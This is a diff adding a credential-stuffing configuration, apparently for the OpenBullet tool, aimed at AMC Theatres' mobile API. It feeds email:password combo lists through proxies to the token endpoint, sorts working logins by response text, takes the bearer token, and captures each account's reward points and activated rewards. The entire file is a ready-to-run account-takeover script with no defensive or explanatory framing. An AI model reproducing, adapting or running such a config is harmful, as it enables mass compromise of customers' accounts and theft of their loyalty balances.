@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "amcbb",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-26T11:38:46.255635+00:00",
+  "AdditionalInfo": "",
+  "Author": "leehzet",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://deviceapi.amctheatres.com/api/token-v2" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&client_id=A9EEBB05-2E8F-4129-A1A3-9D2DE8BAFD8C" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-AMC-Session-Id: a1565ae1-673e-4499-a6e4-d2a4d49a9c73" 
+  HEADER "X-AMC-Transaction-Id: 7a9bea22-0832-425c-8f5d-f172899d307d" 
+  HEADER "X-AMC-Request-Id: 31fd6d0c-537b-4ba7-8caf-a9a776fbe679" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Content-Length: 121" 
+  HEADER "Connection: Keep-Alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"," Recursive=FALSE -> VAR "token" "" "" 
+REQUEST GET "https://deviceapi.amctheatres.com/api/account/reward-summary" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "api-version: 1" 
+  HEADER "X-AMC-Session-Id: a1565ae1-673e-4499-a6e4-d2a4d49a9c73" 
+  HEADER "X-AMC-Transaction-Id: 28e83e41-9e4f-44a1-8ef0-393c9b1e3b12" 
+  HEADER "X-AMC-Request-Id: 8b66ccb2-1045-4180-b4ca-7ba8bad6b910" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Connection: Keep-Alive" 
+PARSE "<SOURCE>" JSON "activatedRewards" Recursive=FALSE -> CAP "activatedRewards" "" "" 
+PARSE "<SOURCE>" JSON "pendingPoints" Recursive=FALSE -> CAP "pendingPoints" "" "" 
+PARSE "<SOURCE>" JSON "pointBalance" Recursive=FALSE -> CAP "pointBalance" "" "" 
